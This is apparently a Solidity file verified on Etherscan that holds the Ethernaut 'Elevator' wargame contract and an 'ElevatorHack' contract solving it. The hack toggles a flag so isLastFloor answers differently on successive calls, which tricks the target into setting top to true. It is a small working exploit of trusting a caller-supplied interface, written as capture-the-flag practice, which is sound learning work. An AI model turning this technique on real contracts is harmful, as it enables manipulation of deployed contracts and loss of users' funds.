/**
 *Submitted for verification at Etherscan.io on 2022-07-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorHack is Building {
  Elevator public target;
  bool public flag;

  constructor(Elevator _target) public {
    target = _target;
  }

  function isLastFloor(uint) external override returns (bool) {
    bool res = flag;
    flag = !flag;
    return res;
  }

  function hack(uint256 floor) external {
    target.goTo(floor);
  }

}